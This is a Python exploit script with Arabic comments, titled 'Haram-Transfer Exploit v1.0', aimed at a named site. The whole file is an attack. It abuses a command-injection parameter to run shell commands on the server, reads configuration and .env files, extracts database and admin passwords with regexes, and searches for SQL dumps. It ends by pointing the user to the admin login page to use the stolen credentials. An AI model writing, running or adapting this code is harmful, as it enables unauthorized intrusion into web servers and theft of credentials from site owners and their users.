#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import urllib.parse
import sys
import re

class HaramExploit:
    def __init__(self, target_url):
        self.target = target_url.rstrip('/')
        
    def execute_command(self, command):
        """تنفيذ أوامر عبر ثغرة Command Injection في parameter 'cmd'"""
        url = f"{self.target}/?cmd={urllib.parse.quote(command)}"
        try:
            response = requests.get(url, timeout=10, verify=False)
            return response.text.strip()
        except Exception as e:
            return None

    def dump_credentials(self, data):
        """استخراج وعرض البيانات - مثل دالة dump في Winbox"""
        print("\n" + "="*60)
        print("ADMIN CREDENTIALS EXTRACTED")
        print("="*60)
        
        found_creds = False
        
        # أنماط البحث عن بيانات المدير
        patterns = {
            'DB_USER': r"DB_USER.*?['\"]([^'\"]+)",
            'DB_PASSWORD': r"DB_PASS.*?['\"]([^'\"]+)", 
            'DB_NAME': r"DB_NAME.*?['\"]([^'\"]+)",
            'DB_HOST': r"DB_HOST.*?['\"]([^'\"]+)",
            'ADMIN_USER': r"['\"]admin['\"].*?['\"]([^'\"]+)",
            'ADMIN_PASSWORD': r"admin_pass.*?['\"]([^'\"]+)",
            'USERNAME': r"username.*?['\"]([^'\"]+)",
            'PASSWORD': r"password.*?['\"]([^'\"]+)"
        }
        
        for key, pattern in patterns.items():
            matches = re.findall(pattern, data, re.IGNORECASE)
            for match in matches:
                if match:
                    print(f"{key}: {match}")
                    found_creds = True
        
        if not found_creds:
            print("No clear credentials found in config files")
            print("Raw data preview:")
            print(data[:500])

    def exploit_command_injection(self):
        """استغلال ثغرة Command Injection للحصول على بيانات المدير"""
        print(f"Testing command injection at {self.target}")
        
        # اختبار الثغرة
        test_cmd = "whoami"
        test_result = self.execute_command(test_cmd)
        
        if not test_result or 'www-data' not in test_result:
            print("FAILED: Command injection not working")
            return False
        
        print("SUCCESS: Command injection verified")
        print(f"Current user: {test_result}")
        
        # استخراج ملفات الإعدادات
        config_files = [
            "/var/www/html/config.php",
            "/var/www/html/.env",
            "/var/www/html/database.php",
            "/var/www/html/wp-config.php",
            "/var/www/html/app/config/database.php",
            "/var/www/html/config/database.php"
        ]
        
        for config_file in config_files:
            print(f"Reading {config_file}...")
            content = self.execute_command(f"cat {config_file} 2>/dev/null")
            
            if content and len(content) > 50:
                print(f"SUCCESS: Retrieved {config_file}")
                self.dump_credentials(content)
                return True
        
        # إذا ما في ملفات إعدادات, جرب نبحث في الملفات الأخرى
        print("Searching for other sensitive files...")
        search_cmds = [
            "grep -r 'password' /var/www/html/ 2>/dev/null | head -5",
            "find /var/www -name '*.sql' 2>/dev/null | head -3"
        ]
        
        for cmd in search_cmds:
            result = self.execute_command(cmd)
            if result:
                print(f"Found: {result}")
        
        return True

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 haram_exploit.py TARGET_URL")
        print("Example: python3 haram_exploit.py https://haram-transfer.com")
        sys.exit(1)

    target = sys.argv[1]
    
    print("Haram-Transfer Exploit v1.0")
    print("="*40)
    print(f"Target: {target}")
    print("Exploiting: Command Injection + Admin Panel")
    print("="*40)
    
    exploit = HaramExploit(target)
    
    # استغلال الثغرات
    if exploit.exploit_command_injection():
        print("\n" + "="*40)
        print("EXPLOIT SUCCESSFUL")
        print("="*40)
        print(f"Admin Panel: {target}/admin")
        print(f"Login Page: {target}/admin/login")
        print("\nUse extracted credentials to access admin panel")
    else:
        print("\nEXPLOIT FAILED")

if __name__ == "__main__":
    main()